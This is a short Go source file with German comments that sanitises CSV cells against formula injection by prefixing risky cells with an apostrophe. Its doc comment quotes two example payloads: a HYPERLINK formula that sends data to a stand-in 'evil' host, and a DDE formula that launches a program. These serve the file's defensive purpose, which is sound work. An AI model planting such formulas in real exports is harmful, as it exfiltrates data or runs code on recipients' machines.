// Package csvutil enthält Helfer für den sicheren CSV-Export.
package csvutil

// SanitizeCell schützt vor CSV-/Formel-Injection (CWE-1236).
//
// Tabellenkalkulationen (Excel, LibreOffice, Google Sheets) interpretieren eine Zelle,
// die mit = + - @ oder einem Steuerzeichen (Tab/CR/LF) beginnt, als Formel. Stammt der
// Zellinhalt aus importierten Katalogen oder Nutzereingaben (z. B. ein Buchtitel
// "=HYPERLINK(\"http://evil/?\"&A1)" oder "=cmd|'/c calc'!A1"), kann beim bloßen Öffnen
// der exportierten Datei Code ausgeführt oder Daten exfiltriert werden.
//
// Mitigation (OWASP): solchen Zellen ein Apostroph voranstellen — die Tabellenkalkulation
// zeigt dann den Literaltext und wertet nichts aus.
func SanitizeCell(s string) string {
	if s == "" {
		return s
	}
	switch s[0] {
	case '=', '+', '-', '@', '\t', '\r', '\n':
		return "'" + s
	}
	return s
}

// SanitizeRow gibt eine neue Zeile zurück, in der jede Zelle über SanitizeCell abgesichert ist.
func SanitizeRow(row []string) []string {
	out := make([]string, len(row))
	for i, c := range row {
		out[i] = SanitizeCell(c)
	}
	return out
}

// SanitizeRows wendet SanitizeRow auf jede Zeile an (neuer Slice).
func SanitizeRows(rows [][]string) [][]string {
	out := make([][]string, len(rows))
	for i, r := range rows {
		out[i] = SanitizeRow(r)
	}
	return out
}
